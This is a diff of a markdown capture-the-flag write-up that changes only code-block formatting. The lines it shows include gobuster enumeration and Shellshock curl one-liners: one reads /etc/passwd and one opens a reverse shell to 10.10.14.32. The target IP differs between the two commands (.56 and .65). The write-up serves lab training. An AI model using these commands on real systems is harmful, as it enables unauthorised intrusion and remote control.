@@ -14,13 +14,14 @@ So I used gobuster again, this time with specific extensions to see if there is 
 ```gobuster dir -u http://10.10.10.56/cgi-bin/ -x .php,.html,.txt,.sh -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30``` </br>
 I found a script called user.sh located in the /cgi-bin/ directory. </br>
 To exploit it I used this one-liner from [GitHub](https://github.com/opsxcq/exploit-CVE-2014-6271): </br>
-```
+```bash
 curl -H “user-agent: () { :; }; echo; echo; /bin/bash -c ‘cat /etc/passwd’ ” \
 http://10.10.10.56/cgi-bin/user.sh
-``` </br>
+``` 
+</br>
 
 To get a reverse shell I changed it to this: </br>
-```
+```bash
 curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.32/1234 0>&1" http://10.10.10.65/cgi-bin/user.sh
 ``` </br>
 
